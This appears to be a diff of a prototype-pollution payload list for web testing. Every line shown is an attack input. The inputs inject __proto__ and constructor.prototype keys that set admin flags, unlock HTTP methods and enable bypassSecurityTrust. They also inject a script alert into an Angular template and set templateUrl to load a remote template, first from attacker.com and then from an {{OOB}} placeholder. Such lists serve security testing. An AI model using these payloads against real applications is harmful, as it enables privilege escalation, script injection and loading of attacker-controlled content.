@@ -65,7 +65,7 @@ constructor.prototype.admin=true
 {"__proto__": {"allowedUnsafeMethods": ["GET","POST","PUT","DELETE","PATCH","HEAD","OPTIONS"]}}
 {"constructor": {"prototype": {"bypassSecurityTrust": true}}}
 {"__proto__": {"ngTemplate": "<script>alert(1)</script>"}}
-{"__proto__": {"templateUrl": "//attacker.com/template.html"}}
+{"__proto__": {"templateUrl": "//{{OOB}}/template.html"}}
 
 # ── LODASH / UNDERSCORE SPECIFIC ──
 {"a.__proto__": {"polluted": "yes"}}
